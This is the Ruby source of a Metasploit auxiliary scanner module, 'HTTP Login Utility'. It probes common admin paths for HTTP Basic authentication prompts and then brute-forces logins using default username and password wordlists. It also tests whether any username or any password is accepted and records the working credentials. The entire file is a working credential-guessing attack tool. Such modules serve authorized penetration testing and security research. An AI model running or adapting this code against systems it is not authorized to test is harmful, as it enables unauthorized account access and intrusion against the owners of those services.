##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'


class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::AuthBrute

	include Msf::Auxiliary::Scanner

	def initialize
		super(
			'Name'           => 'HTTP Login Utility',
			'Version'        => '$Revision$',
			'Description'    => 'This module attempts to authenticate to a HTTP service.',
			'References'  =>
				[

				],
			'Author'         => [ 'hdm' ],
			'License'        => MSF_LICENSE
		)

		register_options(
			[
				Opt::RPORT(80),
				OptPath.new('USERPASS_FILE',  [ false, "File containing users and passwords separated by space, one pair per line",
					File.join(Msf::Config.install_root, "data", "wordlists", "http_default_userpass.txt") ]),
				OptPath.new('USER_FILE',  [ false, "File containing users, one pair per line",
					File.join(Msf::Config.install_root, "data", "wordlists", "http_default_users.txt") ]),
				OptPath.new('PASS_FILE',  [ false, "File containing passwords, one pair per line",
					File.join(Msf::Config.install_root, "data", "wordlists", "http_default_pass.txt") ]),
				OptString.new('UserAgent', [ true, "The HTTP User-Agent sent in the request",
					'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)' ]),
				OptString.new('AUTH_URI', [ false, "The URI to authenticate against (default:auto)" ])
			], self.class)
		register_autofilter_ports([ 80, 443, 8080, 8081, 8000, 8008, 8443, 8444, 8880, 8888 ])
	end


	def find_auth_uri
		if datastore['AUTH_URI'] and datastore['AUTH_URI'].length > 0
			return datastore['AUTH_URI']
		end
		paths = %W{
			/
			/admin/
			/auth/
			/manager/
			/Management.asp
		}

		paths.each do |path|
			res = send_request_cgi({
				'uri'     => path,
				'method'  => 'GET',
				'headers' => {
					'User-Agent' => datastore['UserAgent']
				}
			}, 10)

			next if not res
			if res.code == 301 or res.code == 302 and res.headers['Location'] and res.headers['Location'] !~ /^http/
				path = res.headers['Location']
				res = send_request_cgi({
					'uri'     => path,
					'method'  => 'GET',
					'headers' => {
						'User-Agent' => datastore['UserAgent']
					}
				}, 10)
				next if not res
				next if not res.code == 401
				return path
			end

			next if not res.code == 401
			return path
		end
		return nil
	end

	def target_url
		proto = "http"
		if rport == 443 or ssl
			proto = "https"
		end
		"#{proto}://#{rhost}:#{rport}#{@uri.to_s}"
	end

	def run_host(ip)

		@uri = find_auth_uri
		if ! @uri
			print_error("#{target_url} No URI found that asks for HTTP authentication")
			return
		end

		@uri = "/#{@uri}" if @uri[0,1] != "/"

		print_status("Attempting to login to #{target_url}")

		each_user_pass { |user, pass|
			do_login(user, pass)
		}
	end

	def do_login(user='admin', pass='admin')
		verbose = datastore['VERBOSE']
		vprint_status("#{target_url} - Trying username:'#{user}' with password:'#{pass}'")
		success = false
		proof   = ""

		ret  = do_http_login(user,pass)
		return :abort if ret == :abort
		if ret == :success
			proof   = @proof.dup
			success = true
		end

		if success
			print_good("#{target_url} - Successful login '#{user}' : '#{pass}'")

			any_user = false
			any_pass = false

			any_user  = do_http_login(Rex::Text.rand_text_alpha(8), pass)
			any_pass  = do_http_login(user, Rex::Text.rand_text_alpha(8))

			if any_user == :success
				user = "anyuser"
				print_status("#{target_url} - Any username with password '#{pass}' is allowed")
			end

			if any_pass == :success
				pass = "anypass"
				print_status("#{target_url} - Any password with username '#{user}' is allowed")
			end

			report_auth_info(
				:host   => rhost,
				:proto  => 'http',
				:user   => user,
				:pass   => pass,
				:target_host => rhost,
				:target_port => rport,
				:proof  => proof.to_s,
				:critical => true
			)

			return :abort if (any_user or any_pass)
			return :next_user
		else
			vprint_error("#{target_url} - Failed to login as '#{user}'")
			return
		end
	end

	def do_http_login(user,pass)
		user_pass = Rex::Text.encode_base64(user + ":" + pass)

		begin
			res = send_request_cgi({
				'uri'     => @uri,
				'method'  => 'GET',
				'headers' =>
					{
						'Authorization' => "Basic #{user_pass}",
					}
				}, 25)

			unless (res.kind_of? Rex::Proto::Http::Response)
				vprint_error("#{target_url} not responding")
				return :abort
			end

			return :abort if (res.code == 404)

			if res.code == 200
				@proof   = res
				return :success
			end

		rescue ::Rex::ConnectionError
			vprint_error("#{target_url} - Failed to connect to the web server")
			return :abort
		end

		return :fail
	end
end

